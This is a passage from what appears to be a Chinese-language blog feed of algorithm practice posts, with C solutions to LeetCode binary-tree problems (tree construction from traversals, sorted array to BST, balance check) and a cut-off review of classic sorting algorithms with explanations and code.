class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><br><span class="hljs-keyword">struct</span> TreeNode* <span class="hljs-title function_">buildTree</span><span class="hljs-params">(<span class="hljs-type">int</span>* preorder, <span class="hljs-type">int</span> preorderSize, <span class="hljs-type">int</span>* inorder, <span class="hljs-type">int</span> inorderSize)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">newNode</span>;</span><br>    <span class="hljs-type">int</span> p = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (preorder == <span class="hljs-literal">NULL</span> || inorder == <span class="hljs-literal">NULL</span> || preorderSize &lt;= <span class="hljs-number">0</span> || inorderSize &lt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    newNode = (<span class="hljs-keyword">struct</span> TreeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> TreeNode));<br>    newNode-&gt;val = preorder[p];<br>    newNode-&gt;left = <span class="hljs-literal">NULL</span>;<br>    newNode-&gt;right = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; inorderSize; i++) &#123;<br>        <span class="hljs-keyword">if</span> (inorder[i] == newNode-&gt;val) &#123;<br>            newNode-&gt;left = buildTree(&amp;preorder[p + <span class="hljs-number">1</span>], i, inorder, i);<br>            newNode-&gt;right = buildTree(&amp;preorder[p + i + <span class="hljs-number">1</span>], preorderSize - i - <span class="hljs-number">1</span>, &amp;inorder[i + <span class="hljs-number">1</span>], inorderSize - i - <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> newNode;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-从中序与后序遍历序列构造二叉树"><a href="#6-从中序与后序遍历序列构造二叉树" class="headerlink" title="6.从中序与后序遍历序列构造二叉树"></a>6.从中序与后序遍历序列构造二叉树</h2><h3 id="6-1题目描述"><a href="#6-1题目描述" class="headerlink" title="6.1题目描述"></a>6.1题目描述</h3><p>根据一棵树的中序遍历与后序遍历构造二叉树。</p><p>注意:<br>你可以假设树中没有重复的元素。</p><p>例如，给出</p><p>中序遍历 inorder &#x3D; [9,3,15,20,7]<br>后序遍历 postorder &#x3D; [9,15,7,20,3]</p><p>返回如下的二叉树：</p><p>​     3</p><p>​    &#x2F; <br>  9  20<br>​       &#x2F;  <br>​     15   7</p><p>来源：<a href="https://leetcode-cn.com/problems/construct-binary-tree-from-inorder-and-postorder-traversal">https://leetcode-cn.com/problems/construct-binary-tree-from-inorder-and-postorder-traversal</a></p><h3 id="6-2思路"><a href="#6-2思路" class="headerlink" title="6.2思路"></a>6.2思路</h3><p>和上面的基本差不多，后序遍历的顺序是  Left -&gt; Right -&gt;Root，这就能方便的从根开始构造一棵树。<br>首先，postorder中的最后一个元素一定是树的根，这个根又将 inorder 序列分成了左右两棵子树。现在我们只需要将后序遍历的数组中删除根元素，然后重复上面的过程处理左右两棵子树。</p><h3 id="6-3代码"><a href="#6-3代码" class="headerlink" title="6.3代码"></a>6.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><br><span class="hljs-keyword">struct</span> TreeNode* <span class="hljs-title function_">buildTree</span><span class="hljs-params">(<span class="hljs-type">int</span>* inorder, <span class="hljs-type">int</span> inorderSize, <span class="hljs-type">int</span>* postorder, <span class="hljs-type">int</span> postorderSize)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span>* <span class="hljs-title">newNode</span>;</span><br>    <span class="hljs-type">int</span> p = postorderSize - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (postorder == <span class="hljs-literal">NULL</span> || inorder == <span class="hljs-literal">NULL</span> || postorderSize &lt;= <span class="hljs-number">0</span> || inorderSize &lt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br>    newNode = (<span class="hljs-keyword">struct</span> TreeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> TreeNode));<br>    newNode-&gt;val = postorder[p];<br>    newNode-&gt;left = <span class="hljs-literal">NULL</span>;<br>    newNode-&gt;right = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; inorderSize ; i++) &#123;<br>        <span class="hljs-keyword">if</span> (inorder[i] == newNode-&gt;val) &#123;<br>            newNode-&gt;right = buildTree(&amp;inorder[i + <span class="hljs-number">1</span>], inorderSize - i - <span class="hljs-number">1</span>,&amp;postorder[i], postorderSize - i - <span class="hljs-number">1</span>);<br>            newNode-&gt;left = buildTree(inorder, i,postorder, i);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> newNode;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-将有序数组转换为二叉搜索树"><a href="#7-将有序数组转换为二叉搜索树" class="headerlink" title="7.将有序数组转换为二叉搜索树"></a>7.将有序数组转换为二叉搜索树</h2><h3 id="7-1题目描述"><a href="#7-1题目描述" class="headerlink" title="7.1题目描述"></a>7.1题目描述</h3><p>将一个按照升序排列的有序数组，转换为一棵高度平衡二叉搜索树。</p><p>本题中，一个高度平衡二叉树是指一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过 1。</p><p>示例:</p><p>给定有序数组: [-10,-3,0,5,9],</p><p>一个可能的答案是：[0,-3,9,-10,null,5]，它可以表示下面这个高度平衡二叉搜索树：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">     <span class="hljs-number">0</span><br>    / \<br>  -<span class="hljs-number">3</span>   <span class="hljs-number">9</span><br>  <span class="hljs-regexp">/   /</span><br>-<span class="hljs-number">10</span>  <span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><p>来源：<a href="https://leetcode-cn.com/problems/convert-sorted-array-to-binary-search-tree">https://leetcode-cn.com/problems/convert-sorted-array-to-binary-search-tree</a></p><h3 id="7-2思路分析"><a href="#7-2思路分析" class="headerlink" title="7.2思路分析"></a>7.2思路分析</h3><p>二叉搜索树就是节点的左子树只包含小于当前节点的数。节点的右子树只包含大于当前节点的数。所有左子树和右子树自身必须也是二叉搜索树。</p><p>我们首先要找到根节点，根节点就是数组最中间的值，如果是奇数就取最中间，偶数我们这里选择取中间靠左的位置，直接（left+right）&#x2F;2即可，然后左边调用left<del>mid，右边mid+1</del>right，递归调用即可。</p><h3 id="7-3代码"><a href="#7-3代码" class="headerlink" title="7.3代码"></a>7.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">struct</span> TreeNode* <span class="hljs-title function_">helper</span><span class="hljs-params">(<span class="hljs-type">int</span> left,<span class="hljs-type">int</span> right,<span class="hljs-type">int</span> *nums)</span>&#123;<br>    <span class="hljs-keyword">if</span>(left &gt;= right)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> midpos = <span class="hljs-number">0</span>;<br>    midpos = (left+right)/<span class="hljs-number">2</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">TreeNode</span> *<span class="hljs-title">node</span> =</span> <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> TreeNode));<br>    node-&gt;val = nums[midpos];<br>    node-&gt;left = helper(left,midpos,nums);<br>    node-&gt;right = helper(midpos+<span class="hljs-number">1</span>,right,nums);<br><br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br><br><span class="hljs-keyword">struct</span> TreeNode* <span class="hljs-title function_">sortedArrayToBST</span><span class="hljs-params">(<span class="hljs-type">int</span>* nums, <span class="hljs-type">int</span> numsSize)</span>&#123;<br>    <span class="hljs-keyword">return</span> helper(<span class="hljs-number">0</span>,numsSize,nums);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="8-平衡二叉树"><a href="#8-平衡二叉树" class="headerlink" title="8.平衡二叉树"></a>8.平衡二叉树</h2><h3 id="8-1题目描述"><a href="#8-1题目描述" class="headerlink" title="8.1题目描述"></a>8.1题目描述</h3><p>给定一个二叉树，判断它是否是高度平衡的二叉树。<br>本题中，一棵高度平衡二叉树定义为：<br>一个二叉树每个节点 的左右两个子树的高度差的绝对值不超过1。<br>示例 1:<br>给定二叉树 [3,9,20,null,null,15,7]</p><p>返回 true 。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livescript">  <span class="hljs-number">3</span><br> / <span class="hljs-string">\</span><br><span class="hljs-number">9</span>  <span class="hljs-number">20</span><br>  /  <span class="hljs-string">\</span><br> <span class="hljs-number">15</span>   <span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>返回 true 。</p><p>示例 2:<br>给定二叉树 [1,2,2,3,3,null,null,4,4]</p><p>返回 false 。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livescript">      <span class="hljs-number">1</span><br>     / <span class="hljs-string">\</span><br>    <span class="hljs-number">2</span>   <span class="hljs-number">2</span><br>   / <span class="hljs-string">\</span><br>  <span class="hljs-number">3</span>   <span class="hljs-number">3</span><br> / <span class="hljs-string">\</span><br><span class="hljs-number">4</span>   <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><p>返回 false 。</p><p>来源：<a href="https://leetcode-cn.com/problems/balanced-binary-tree/">https://leetcode-cn.com/problems/balanced-binary-tree/</a></p><h3 id="8-2思路"><a href="#8-2思路" class="headerlink" title="8.2思路"></a>8.2思路</h3><p>这个最简单的方法就是不停计算子树的最大深度，如果相差大于1，就不是平衡二叉树。结合前面的查找二叉树的最大深度来写这个代码。</p><h3 id="8-3代码"><a href="#8-3代码" class="headerlink" title="8.3代码"></a>8.3代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     struct TreeNode *left;</span><br><span class="hljs-comment"> *     struct TreeNode *right;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span>&#123;<br>    <span class="hljs-keyword">if</span>(a&gt;b)&#123;<br>        <span class="hljs-keyword">return</span> a;<br>    &#125;<br>    <span class="hljs-keyword">return</span> b;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">maxDepth</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span>&#123;<br>    <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">int</span> left_height = maxDepth(root-&gt;left);<br>        <span class="hljs-type">int</span> right_height = maxDepth(root-&gt;right);<br>        <span class="hljs-keyword">return</span> max(left_height, right_height) + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">isBalanced</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> TreeNode* root)</span>&#123;<br>    <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">abs</span>(maxDepth(root-&gt;right)-maxDepth(root-&gt;left)) &gt; <span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> isBalanced(root-&gt;left)&amp;&amp;isBalanced(root-&gt;right);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>DFS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>算法练习-排序算法</title>
    <link href="/blog/2020/03/03/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
    <url>/blog/2020/03/03/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p><strong>今天主要复习一下各种排序算法，以后机试可能会有用。</strong></p><p><img src="/images/fj36.jpg"></p><span id="more"></span><h2 id="1-冒泡排序"><a href="#1-冒泡排序" class="headerlink" title="1.冒泡排序"></a>1.冒泡排序</h2><p>冒泡排序是一种简单的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果它们的顺序错误就把它们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。</p><h3 id="1-1算法描述"><a href="#1-1算法描述" class="headerlink" title="1.1算法描述"></a>1.1算法描述</h3><p>步骤1: 比较相邻的元素。如果第一个比第二个大，就交换它们两个；<br>步骤2: 对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对，这样在最后的元素应该会是最大的数；<br>步骤3: 针对所有的元素重复以上的步骤，除了最后一个；<br>步骤4: 重复步骤1~3，直到排序完成。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMjMyMzg0NDktMjE0NjE2OTE5Ny5naWY"></p><h3 id="1-2代码"><a href="#1-2代码" class="headerlink" title="1.2代码"></a>1.2代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>* <span class="hljs-title function_">bubbleSort</span><span class="hljs-params">(<span class="hljs-type">int</span>* numArray,<span class="hljs-type">int</span> numLen)</span>&#123;<br>    <span class="hljs-type">int</span> i,j,temp;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i&lt;numLen;i++)&#123;<br>    <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>;j&lt;numLen-i<span class="hljs-number">-1</span>;j++)&#123;<br>    <span class="hljs-keyword">if</span>(numArray[j]&gt;numArray[j+<span class="hljs-number">1</span>])&#123;<br>    temp = numArray[j+<span class="hljs-number">1</span>];<br>    numArray[j+<span class="hljs-number">1</span>]=numArray[j];<br>    numArray[j]=temp;<br>    &#125;<br>    &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> numArray;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-选择排序"><a href="#2-选择排序" class="headerlink" title="2.选择排序"></a>2.选择排序</h2><p>选择排序 是表现最稳定的排序算法之一 ，因为无论什么数据进去都是O(n2)的时间复杂度 ，所以用到它的时候，数据规模越小越好。唯一的好处可能就是不占用额外的内存空间了吧。理论上讲，选择排序可能也是平时排序一般人想到的最多的排序方法。<br>    选择排序(Selection-sort) 是一种简单直观的排序算法。它的工作原理：首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。</p><h3 id="2-1算法描述"><a href="#2-1算法描述" class="headerlink" title="2.1算法描述"></a>2.1算法描述</h3><p> n个记录的直接选择排序可经过n-1趟直接选择排序得到有序结果。具体算法描述如下：<br>    步骤1：初始状态：无序区为R[1…n]，有序区为空；<br>    步骤2：第i趟排序(i&#x3D;1,2,3…n-1)开始时，当前有序区和无序区分别为R[1…i-1]和R(i…n）。该趟排序从当前无序区中-选出关键字最小的记录 R[k]，将它与无序区的第1个记录R交换，使R[1…i]和R[i+1…n)分别变为记录个数增加1个的新有序区和记录个数减少1个的新无序区；<br>    步骤3：n-1趟结束，数组有序化了</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMjQ3MTk1OTAtMTQzMzIxOTgyNC5naWY"></p><h3 id="2-2代码"><a href="#2-2代码" class="headerlink" title="2.2代码"></a>2.2代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>* <span class="hljs-title function_">selectionSort</span><span class="hljs-params">(<span class="hljs-type">int</span>* numArray,<span class="hljs-type">int</span> numLen)</span>&#123;<br>    <span class="hljs-type">int</span> i,j,minIndex,temp;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i&lt;numLen;i++)&#123;<br>    minIndex = i;<br>    <span class="hljs-keyword">for</span>(j = i;j&lt;numLen;j++)&#123;<br>    <span class="hljs-keyword">if</span>(numArray[j]&lt;numArray[minIndex])&#123;<br>    minIndex = j;<br>    &#125;<br>    &#125;<br>    temp = numArray[minIndex];<br>    numArray[minIndex]=numArray[i];<br>    numArray[i]=temp;<br>    &#125;<br>    <span class="hljs-keyword">return</span> numArray;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-插入排序"><a href="#3-插入排序" class="headerlink" title="3.插入排序"></a>3.插入排序</h2><p>插入排序（Insertion-Sort） 的算法描述是一种简单直观的排序算法。它的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。插入排序在实现上，通常采用in-place排序（即只需用到O(1)的额外空间的排序），因而在从后向前扫描过程中，需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。</p><h3 id="3-1算法描述"><a href="#3-1算法描述" class="headerlink" title="3.1算法描述"></a>3.1算法描述</h3><p>一般来说，插入排序都采用in-place在数组上实现。具体算法描述如下：<br>        步骤1: 从第一个元素开始，该元素可以认为已经被排序；<br>        步骤2: 取出下一个元素，在已经排序的元素序列中从后向前扫描；<br>        步骤3: 如果该元素（已排序）大于新元素，将该元素移到下一位置；<br>        步骤4: 重复步骤3，直到找到已排序的元素小于或者等于新元素的位置；<br>        步骤5: 将新元素插入到该位置后；<br>        步骤6: 重复步骤2~5</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMjU2NDUyNzctMTE1MTEwMDAwMC5naWY"></p><h3 id="3-2代码"><a href="#3-2代码" class="headerlink" title="3.2代码"></a>3.2代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>* <span class="hljs-title function_">insertionSort</span><span class="hljs-params">(<span class="hljs-type">int</span>* numArray,<span class="hljs-type">int</span> numLen)</span>&#123;<br>    <span class="hljs-type">int</span> i,j,preIndex,temp;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>;i&lt;numLen<span class="hljs-number">-1</span>;i++)&#123;<br>    temp = numArray[i+<span class="hljs-number">1</span>];<br>    preIndex = i;<br>    <span class="hljs-keyword">while</span>(preIndex&gt;=<span class="hljs-number">0</span>&amp;&amp;temp&lt;numArray[preIndex])&#123;<br>    numArray[preIndex+<span class="hljs-number">1</span>]=numArray[preIndex];<br>    preIndex--;<span class="hljs-comment">//标志位前移 </span><br>    &#125;<br>    numArray[preIndex+<span class="hljs-number">1</span>] = temp;<br>    &#125;<br>    <span class="hljs-keyword">return</span> numArray;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="4-希尔排序"><a href="#4-希尔排序" class="headerlink" title="4.希尔排序"></a>4.希尔排序</h2><p>希尔排序是希尔（Donald Shell） 于1959年提出的一种排序算法。希尔排序也是一种插入排序，它是简单插入排序经过改进之后的一个更高效的版本，也称为缩小增量排序，同时该算法是冲破O(n2）的第一批算法之一。它与插入排序的不同之处在于，它会优先比较距离较远的元素。希尔排序又叫缩小增量排序。</p><p>希尔排序是把记录按下表的一定增量分组，对每组使用直接插入排序算法排序；随着增量逐渐减少，每组包含的关键词越来越多，当增量减至1时，整个文件恰被分成一组，算法便终止。</p><h3 id="4-1算法描述"><a href="#4-1算法描述" class="headerlink" title="4.1算法描述"></a>4.1算法描述</h3><p>​        我们来看下希尔排序的基本步骤，在此我们选择增量gap&#x3D;length&#x2F;2，缩小增量继续以gap &#x3D; gap&#x2F;2的方式，这种增量选择我们可以用一个序列来表示，{n&#x2F;2,(n&#x2F;2)&#x2F;2…1}，称为增量序列。希尔排序的增量序列的选择与证明是个数学难题，我们选择的这个增量序列是比较常用的，也是希尔建议的增量，称为希尔增量，但其实这个增量序列不是最优的。此处我们做示例使用希尔增量。<br>先将整个待排序的记录序列分割成为若干子序列分别进行直接插入排序，具体算法描述：<br>​    步骤1：选择一个增量序列t1，t2，…，tk，其中ti&gt;tj，tk&#x3D;1；<br>​步骤2：按增量序列个数k，对序列进行k 趟排序；<br>​步骤3：每趟排序，根据对应的增量ti，将待排序列分割成若干长度为m 的子序列，分别对各子表进行直接插入排序。仅增量因子为1 时，整个序列作为一个表来处理，表长度即为整个序列的长度。</p><h3 id="4-2代码"><a href="#4-2代码" class="headerlink" title="4.2代码"></a>4.2代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span>* <span class="hljs-title function_">shellSort</span><span class="hljs-params">(<span class="hljs-type">int</span>* numArray,<span class="hljs-type">int</span> numLen)</span>&#123;<br>    <span class="hljs-type">int</span> temp, gap = numLen / <span class="hljs-number">2</span>,i,preIndex;<br>    <span class="hljs-keyword">while</span> (gap &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">for</span> (i = gap; i &lt; numLen; i++) &#123;<br>            temp = numArray[i];<br>            preIndex = i - gap;<br>            <span class="hljs-keyword">while</span> (preIndex &gt;= <span class="hljs-number">0</span> &amp;&amp; numArray[preIndex] &gt; temp) &#123;<br>                numArray[preIndex + gap] = numArray[preIndex];<br>                preIndex -= gap;<br>            &#125;<br>            numArray[preIndex + gap] = temp;<br>        &#125;<br>        gap /= <span class="hljs-number">2</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> numArray;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="5-归并排序"><a href="#5-归并排序" class="headerlink" title="5.归并排序"></a>5.归并排序</h2><p>和选择排序一样，归并排序的性能不受输入数据的影响，但表现比选择排序好的多，因为始终都是O(n log n）的时间复杂度。代价是需要额外的内存空间。<br>归并排序 是建立在归并操作上的一种有效的排序算法。该算法是采用分治法（Divide and Conquer）的一个非常典型的应用。归并排序是一种稳定的排序方法。将已有序的子序列合并，得到完全有序的序列；即先使每个子序列有序，再使子序列段间有序。若将两个有序表合并成一个有序表，称为2-路归并</p><h3 id="5-1算法描述"><a href="#5-1算法描述" class="headerlink" title="5.1算法描述"></a>5.1算法描述</h3><p>步骤1：把长度为n的输入序列分成两个长度为n&#x2F;2的子序列；<br>步骤2：对这两个子序列分别采用归并排序；<br>步骤3：将两个排序好的子序列合并成一个最终的排序序列。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMyMDE3LmNuYmxvZ3MuY29tL2Jsb2cvODQ5NTg5LzIwMTcxMC84NDk1ODktMjAxNzEwMTUyMzA1NTcwNDMtMzczNzUwMTAuZ2lm"></p><h3 id="5-2代码"><a href="#5-2代码" class="headerlink" title="5.2代码"></a>5.2代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 